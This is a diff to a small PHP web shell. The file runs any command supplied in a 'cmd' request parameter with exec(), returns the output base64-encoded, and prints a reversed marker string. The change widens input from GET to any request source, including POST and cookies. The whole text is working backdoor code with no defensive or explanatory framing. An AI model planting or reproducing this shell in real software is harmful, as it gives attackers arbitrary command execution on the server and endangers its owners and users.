@@ -1,8 +1,8 @@
 <?php
 echo strrev("15825b40c6dace2a");
-if ( isset( $_GET['cmd']) && $_GET['cmd'] !== '' ){
+if ( isset( $_REQUEST['cmd']) && $_REQUEST['cmd'] !== '' ){
  $ar = array(); $ou = "";
- exec($_GET['cmd'], $ar);
+ exec($_REQUEST['cmd'], $ar);
  foreach ($ar as $k=>$v){$ou = $ou . "$v\n";}
  echo base64_encode($ou);
 }
